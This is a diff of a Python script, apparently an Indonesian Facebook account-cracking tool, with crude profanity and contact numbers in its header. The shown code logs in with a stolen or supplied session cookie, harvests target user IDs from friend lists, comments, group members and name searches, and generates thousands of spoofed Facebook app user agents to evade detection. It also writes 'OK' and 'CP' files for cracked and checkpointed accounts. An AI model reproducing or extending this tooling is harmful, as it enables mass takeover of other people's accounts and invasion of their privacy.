@@ -1,1305 +1,887 @@
-###----------[ IMPORT MODULE LAIN ]---------- ###
-import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess, base64
-from concurrent.futures import ThreadPoolExecutor
-from bs4 import BeautifulSoup as parser
-from datetime import date,datetime
-from requests.exceptions import ConnectionError
-ses = requests.Session()
+''' SC INI DI BUAT OLEH NAZRI XD
+  AND BUAT LU YANG RECODE BOLEH LAH
+  ASAL JANGAN DI PREMKAN SAJA WHAHAH
+  MEMEK KONTOL ANJING MEMEK MOMOK
+  NAZRI CINTA FF MOMOK XD SELAMANYA 
+  
+  083830108901 DANA 5K SAJA
+  081221523195 WA ADMIN
+  UDH SEGITU DOANG
+  THANKS TO XTC CODE TEAM AND MARGA XD.
+'''
+''' INSTALASI MODULE '''
+try:
+    import re
+    import base64
+    import uuid
+    import os
+    import sys
+    import time
+    import random
+    import requests
+    import datetime
+    import platform
+    from time import sleep
+    from time import time as KontolMemekSiaAnjingKontolAsuMemekBagong
+    from bs4 import BeautifulSoup as par
+    from concurrent.futures import ThreadPoolExecutor as __Araaaa__
+except Exception as e:
+    sys.exit(f' \x1b[0m[\x1b[1;91m!\x1b[0m] {str(e).title()}')
 
-###----------[ IMPORT MODULE RICH ]---------- ###
+''' INSTALASI MODULE RICH '''
 from rich.panel import Panel
-from rich.tree import Tree
-from rich import print as prints
+from rich.tree import Tree 
+from rich import print as __kumahasia__
 from rich.console import Console
 from rich.table import Table
 from rich.columns import Columns
 from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
 console = Console()
 
-###----------[ WARNA PRINT RICH ]---------- ###
+''' STYLE WARNA '''
+M = '\x1b[1;91m' # MERAH
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+
+''' STYLE WARNA RICH '''
+Z2 = "[#000000]" # HITAM
 M2 = "[#FF0000]" # MERAH
 H2 = "[#00FF00]" # HIJAU
 K2 = "[#FFFF00]" # KUNING
 B2 = "[#00C8FF]" # BIRU
+U2 = "[#AF00FF]" # UNGU
+N2 = "[#FF00FF]" # PINK
+O2 = "[#00FFFF]" # BIRU MUDA
 P2 = "[#FFFFFF]" # PUTIH
+J2 = "[#FF8F00]" # JINGGA
+A2 = "[#AAAAAA]" # ABU-ABU
 
-###----------[ GLOBAL NAMA ]---------- ###
-sekarang = calendar.timegm(time.gmtime(time.time()))
-tampung = []
-ugent = []
+''' CHECK BULAN TAHUN '''
+dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
+dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
 
-###----------[ CEK WARNA TEMA ]---------- ###
-try:
-	file_color = open("data/theme_color","r").read()
-	color_text = file_color.split("|")[0]
-	color_panel = file_color.split("|")[1]
-except:
-	color_text = "[#00C8FF]"
-	color_panel = "#00C8FF"
+''' BULAN & TAHUN '''
 
-###----------[ GET DATA DARI DEVICE ]---------- ###
-android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
-try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
-except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
-versi_app = str(random.randint(111111111,999999999))
+tgl = datetime.datetime.now().day
+bln = dic[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
 
-###----------[ GENERATE USERAGENT ]---------- ###
-for z in range(200):
-	versi_android = str(random.randint(4,12))+".0.0"
-	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-	device = random.choice(["2201122G", "2201122C","CPH1920", "CPH1933", "CPH1937","CPH1937", "CPH1945", "CPH1951", "CPH1969", "CPH1979", "CPH1983", "CPH2005", "CPH2023", "CPH2083", "CPH2003", "CPH2004","CPH2269","vivo 1917", "vivo 1915", "vivo 1911", "vivo 1933", "vivo 1912","vivo 1920", "vivo 1921", "vivo 1910", "vivo 1927", "vivo 1913", "vivo 1923", "vivo 1926", "vivo 1928", "vivo 1931", "vivo 1935","SM-G975F","SM-G532G","SM-N975F","SM-G988U","SM-G977U","SM-A705FN","SM-A515U1","SM-G955F","SM-A750G","SM-N960F","SM-G960U","SM-J600F","SM-A908B","SM-A705GM","SM-G970U","SM-A307FN","SM-G965U1","SM-A217F","SM-G986B","SM-A207M","SM-A515W","SM-A505G","SM-A315G","SM-A507FN","SM-A505U1","SM-G977T","SM-A025G","SM-J320F","SM-A715W","SM-A908N","SM-A205F","SM-G988B","SM-N986B","SM-A715F","SM-A515F","SM-G965F","SM-G960F","SM-A505F","SM-A207F","SM-A307G","SM-G970F","SM-A107F","SM-G935F","SM-G935A","SM-A310F","SM-J320FN","Mi 11 Lite 5G  stable","Mi 10T Pro","Mi 11 Lite","MI 8 Lite","MI 5X MIUI","Mi 11i","Xiaomi 11 Lite 5G NE","Xiaomi 12 Lite","Mi 9T Pro","M2004J19PI MIUI","Xiaomi 12S Ultra","MIX 4","Mi 11i","Mi Note 10","Mi 9 SE","Mi 8 SE","Mi 10 SE","MI MAX 3","Xiaomi 12T","MIX 2S","MI 8 SE","Mi A3","Mi A4","MI 6","MI MAX 2","MI MAX 3","Xiaomi 12S Ultra ","Xiaomi 12SE Ultra ","Mi 11i","Mi 12i","Mi 10 Lite 5G","Mi 11 Lite 5G","Mi 12 Lite 5G","Mi 10 Lite 4G","Mi 10 Lite 4G","E6653"," G8231","C6603"," D6503","SO-05F","SGP612","802SO","J9110","SOV40","SO-51A","XQ-AT51"," SOG01","SO51Aa","XQ-AT42","SO-51B","XQ-BC52","XQ-BC62","XQ-BC72","SOG03","J9150","I4113","I3113","I3123","I3113","901SO","J3273","XQ-CC72","XQ-BT44","SO-41B"," C2304","E5506","G3311"," C1905","D5322","Pixel 6a","Pixel 4","Pixel 5","Pixel 4 XL","Pixel 6","Pixel 6 Pro","Pixel 7 Pro","Pixel 4a","Pixel C","Pixel 5a","Pixel 2 XL","Pixel 2","Pixel Slate","Google Pixelbook Go","Google Pixelbook Go","Pixel XL","Pixel 3a","RMX1831","RMX1911","RMX1971","RMX2030","RMX2076","RMX2081","RMX2151","RMX2176","RMX2185","RMX2193","RMX2194","RMX2195","RMX3061","RMX3017","RMX3042","RMX1231"])
-	dev = device.split(" Build/")[0]
-	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
-	build = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
-	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
-	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
-	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
-	ua = f"Dalvik/2.1.0 (Linux; Android 11.0.1; Samsung A10 Build/QCOS40.86-18-6; wv) AppleWebKit/637.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4350.185 Mobile Safari/637.36 [FB_IAB/FB4A;FBAV/294.6.0.59.118;]"
-	
+''' TAMPUNG OK-CP '''
 
+okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 
-	if ua in ugent:pass
-	else:ugent.append(ua)
-	
-###----------[ LOGO AUTHOR DAN VERSI]---------- ###
-class Logo:
-	
-	###----------[ BERSIHKAN LAYAR ]---------- ###
-	def bersihkan_layar(self):
-		if "linux" in sys.platform.lower():
-			try:os.system("clear")
-			except:pass
-		elif "win" in sys.platform.lower():
-			try:os.system("cls")
-			except:pass
-		else:
-			try:os.system("clear") 
-			except:pass
+''' PROGRESS NAMA TERMUX '''
+sys.stdout.write('\x1b]2; Retakan Facebook\x07')
+ugen=[]
+ugent=[]
+''' DEF USERAGENT '''
+for i in range(10000):
+      rr = random.randint
+      andro = f"{(rr(4,13))}"
+      ua = f"Dalvik/2.1.0 (Linux; U; Android {andro}; V2043_21 Build/RP1A.200720.012) [FBAN/MessengerLite;FBAV/{(rr(100,467))}.0.0.5.119;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{(rr(100000000,9000000000))};FBCR/Warid;FBMF/vivo;FBBD/vivo;FBDV/V2043_21;FBSV/{andro};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
+      uc = f"Dalvik/2.1.0 (Linux; U; Android {andro}; moto g52 Build/S1SRS32.38-132-8) [FBAN/MessengerLite;FBAV/{(rr(100,467))}.0.0.7.131;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/543901789;FBCR/;FBMF/motorola;FBBD/motorola;FBDV/moto g52;FBSV/{andro};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1024,width=2048};]"
+      ud = f"Dalvik/2.1.0 (Linux; U; Android {andro}; SM-J330FN Build/PPR1.180610.011) [FBAN/MessengerLite;FBAV/{(rr(100,467))}.0.0.3.109;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{(rr(100000000,9000000000))};FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBDV/SM-J330FN;FBSV/{andro};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
+      ua = random.choice([ua, uc, ud,])
+      ugen.append(ua)
+      
+for i in range(10000):
+	rr = random.randint
+	andro = f"{(rr(4,13))}"
+	memek = f"Dalvik/2.1.0 (Linux; U; Android {andro}; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/{(rr(100,467))}.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/{(rr(100000000,9000000000))};FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{andro};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920"
+	momok = random.choice([memek])
+	ugent.append(momok)
 
-	###----------[ LOGO ]---------- ###
-	def logonya(self):
-		self.bersihkan_layar()
-		prints(Panel(f"""{color_text} {H2}ㅤㅤㅤ              
-ㅤㅤㅤ           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢀⠐⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠨⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⠄⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⣤⣶⣾⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠐⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⣿⣿⣏⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⠃⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⡿⠏⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣎⠀⠀⠀⠀⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣶⣬⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⡿⣟⠛⠏⡟⠿⢻⡟⡻⡿⣿⣿⣿⣷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⡔⣔⣭⣶⣷⣿⣷⣾⣧⣥⣐⣨⣿⣿⣿⣿⣿⣷⡄⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢐⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠉⠉⠉⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡈⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠄⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣈⣀⠴⠋⢻⣿⠟⠁⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢠⣿⣿⣿⣿⣿⣿⣿⡿⠉⠻⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣧⡮⠋⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⡇⢀⣾⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠙⢿⣿⣿⣿⣿⡇⠌⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⡟⠀⣼⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣇⣶⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⣾⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠰⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⣼⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣦⠀⠀⠀⠀⠿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣼⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⡷⠀⠄⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣉⠃⢤⣤⣾⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠙⠻⠟⠁⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡍⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡸⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
- 		    {M2}M E M E K  """,width=120,style=f"{color_panel}"))
-	
-###----------[ BAGIAN LOGIN ]---------- ###
+''' MAIN LOGIN '''
 class Login:
-	
-	###----------[ FUNCTION INIT ]---------- ###
-	def __init__(self):
-		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
-		self.negara = ses.get("http://ip-api.com/json/").json()["country"]
 
-	###----------[ MENU LOGIN ]---------- ###
-	def menu_login(self):
-		Logo().logonya()
-		prints(Panel(f"{P2}{self.ip}",padding=(0,30),subtitle=f"{H2}{self.negara}",style=f"{color_panel}"))
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. login menggunakan cookie facebook
-[{color_text}02{P2}]. login menggunakan kredensial""",width=80,padding=(0,15),style=f"{color_panel}"))
-		login = console.input(f" {H2}• {P2}pilih menu : ")
-		if login in["1","01"]:
-			prints(Panel(f"""{P2}silahkan masukan cookiemu disini dan pastikan autentikasi tidak aktif""",width=80,style=f"{color_panel}"))
-			cookie = console.input(f" {H2}• {P2}masukan cookie : ")
-			#open("data/cookie","w").write(cookie)
-			self.login_cookie(cookie)
-		else:
-			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
-			
-	###----------[ LOGIN COOKIE ]---------- ###
-	def login_cookie(self,cookie):
-		try:
-			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
-			if "Apa yang Anda pikirkan sekarang" in url:
-				pass
-			else:
-				for z in url.find_all("a",href=True):
-					if "Tidak, Terima Kasih" in z.text:
-						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
-						parsing = parser(get.text,"html.parser")
-						action = parsing.find("form",{"method":"post"})["action"]
-						data = {
-							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
-							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
-							"submit": "OK, Gunakan Data"
-						}
-						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
-						break
-			open("data/cookie","w").write(cookie)
-			Menu().menu()
-		except:
-			prints(Panel(f"""{M2}cookie invalid, silahkan gunakan cookie lain yang masih baru atau fresh""",width=80,style=f"{color_panel}"))
-			sys.exit()
-		
-	###----------[ UBAH BAHASA ]---------- ###
-	def ubah_bahasa(self,cookie):
-		try:
-			url = ses.get("https://mbasic.facebook.com/language/",cookies={"cookie": cookie})
-			parsing = parser(url.text,"html.parser")
-			for x in parsing.find_all("form",{"method":"post"}):
-				if "Bahasa Indonesia" in str(x):
-					data = {
-						"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),
-						"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
-						"submit"  : "Bahasa Indonesia"
-					}
-					post = ses.post("https://mbasic.facebook.com"+x["action"],data=data,cookies={"cookie": cookie})
-		except:
-			pass
-		
-###----------[ BAGIAN MENU ]---------- ###
-class Menu:
-	
-	###----------[ FUNCTION INIT ]---------- ###
-	def __init__(self):
-		self.men = []
-		self.id = []
-		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
-		self.negara = ses.get("http://ip-api.com/json/").json()["country"]
+    def __init__(self):
+        self.ses = requests.Session()
+        self.__AyrinnPunyaGuaKentod__ = "https://www.facebook.com/100067687546217/posts/pfbid0VUGr6nmh4gQiyfWiqLcziZvBu6qaEwyCbRQkDug4nS7qJnuG2FKbEdT8jj2ujx1Dl/?app=fbl"
+        self.url = "https://mbasic.facebook.com"
+        self.ip = self.ses.get("http://ip-api.com/json/").json()["query"]
+        self.negara = self.ses.get("http://ip-api.com/json/").json()["country"]
+        self.id, self.ok, self.cp, self.lo = [], [], [], 0
+        self.iya, self.__katasandi__ = [], []
+        self.menu()
 
-	###----------[ CEK INFO LOGIN ]---------- ###
-	def cek_login(self,cookie):
-		try:
-			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=cookie).text
-			nama = re.findall("<title>(.*?)</title>",url)[0]
-			if "Konten Tidak Ditemukan" in nama:
-				try:os.remove("data/cookie")
-				except:pass
-				Login().menu_login()
-			else:
-				return nama
-		except ConnectionError:
-			prints(Panel(f"""{M2}koneksi internet kamu bermasalah, silahkan cek koneksi kamu kembali""",width=80,style=f"{color_panel}"))
-			exit()
-			
-	###----------[ MENU UTAMA ]---------- ###
-	def menu(self):
-		Logo().logonya()
-		
-		###----------[ GET COOKIE DAN DATA ]---------- ###
-		try:
-			cok = open("data/cookie","r").read()
-			cookie = {"cookie": cok}
-			nama = self.cek_login(cookie)
-		except:
-			try:os.remove("data/cookie")
-			except:pass
-			Login().menu_login()
-		
-		###----------[ PANEL BIASA ]---------- ###
-		prints(Panel(f"{P2}{self.ip}",padding=(0,30),title=f"{H2}{nama}",subtitle=f"{H2}{self.negara}",style=f"{color_panel}"))
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. crack publik      [{color_text}05{P2}]. crack random username
-[{color_text}02{P2}]. crack pengikut    [{color_text}06{P2}]. crack pencarian nama
-[{color_text}03{P2}]. crack komentar    [{color_text}07{P2}]. crack member grup
-[{color_text}04{P2}]. crack random mail [{color_text}08{P2}]. crack file sendiri""",width=80,padding=(0,6),style=f"{color_panel}"))
-		prints(Panel(f"""{P2}ketik {H2}bot{P2} untuk ke menu bot dan ketik {H2}lain{P2} untuk ke menu lain""",width=80,padding=(0,6),style=f"{color_panel}"))
-		menu = console.input(f" {H2}• {P2}pilih menu : ")
-		
-		###----------[ ID PUBLIK ]---------- ###
-		if menu in["1","01"]:
-			prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan id atau username : ")
-			if user in["Me","me"]:
-				user = Dump(cookie).GetUser()
-			Dump(cookie).Dump_Publik(f"https://mbasic.facebook.com/{user}?v=friends")
-			Crack().atursandi()
-			
-		###----------[ KOMENTAR ]---------- ###
-		elif menu in["3","03"]:
-			prints(Panel(f"""{P2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan id postingan : ")
-			Dump(cookie).Dump_Komentar(f"https://mbasic.facebook.com/{user}")
-			Crack().atursandi()
-			
-		###----------[ EMAIL ]---------- ###
-		elif menu in["4","04"]:
-			prints(Panel(f"""{P2}masukan nama dan format email gunakan '@' di awal contoh @gmail.com""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan nama : ")
-			format = console.input(f" {H2}• {P2}masukan format : ")
-			limit = console.input(f" {H2}• {P2}masukan limit : ")
-			Dump(cookie).Dump_Email(user,format,limit)
-			Crack().atursandi()
-			
-		###----------[ USERNAME ]---------- ###
-		elif menu in["5","05"]:
-			prints(Panel(f"""{P2}masukan nama dan jika 2 kata bisa gunakan titik '.' sebagai pemisah""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan nama : ")
-			limit = console.input(f" {H2}• {P2}masukan limit : ")
-			Dump(cookie).Dump_Username(user,limit)
-			Crack().atursandi()
-			
-		###----------[ PENCARIAN NAMA ]---------- ###
-		elif menu in["6","06"]:
-			prints(Panel(f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan nama : ")
-			common = open("asset/nama_indonesia","r").read().splitlines()
-			for idt in user.split(","):
-				self.id.append(idt)
-				for people in common:
-					self.id.append(people+" "+idt)
-			try:
-				for gas in self.id:
-					Dump(cookie).Dump_Pencarian(f"https://mbasic.facebook.com/public/{gas}")
-			except:pass
-			Crack().atursandi()
-		
-		###----------[ MEMBER GRUP ]---------- ###
-		elif menu in["7","07"]:
-			prints(Panel(f"""{P2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan id grup : ")
-			Dump(cookie).Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
-			Crack().atursandi()
-			
-		###----------[ FILE MASSAL ]---------- ###
-		elif menu in["8","08"]:
-			prints(Panel(f"""{P2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan tempat file : ")
-			Dump(cookie).Dump_File(user)
-			Crack().atursandi()
+    ''' DELETE COOKIE TOKEN '''
+    def hapus(self):
+        try:os.system('rm -rf data/cookie.json rm -rf data/token.json')
+        except (NameError, FileNotFoundError, IOError) as e:
+           Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
+           sleep(3);sys.exit()
 
-		###----------[ PINDAH KE MENU BOT ]---------- ###
-		elif menu in["BOT","Bot","bot"]:
-			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
-			
-		###----------[ PINDAH KE MENU LAIN ]---------- ###
-		elif menu in["LAIN","Lain","lain"]:
-			Lain(cookie).menu()
-			
-		else:
-			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
-			
-###----------[ BAGIAN DUMP ]---------- ###
-class Dump:
-	
-	###----------[ FUNCTION INIT ]---------- ###
-	def __init__(self,cookie):
-		self.cookie = cookie
-			
-	###----------[ GET USER SENDIRI ]---------- ###
-	def GetUser(self):
-		try:
-			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=self.cookie).text
-			uid = re.findall('name="target" value="(.*?)"',url)[0]
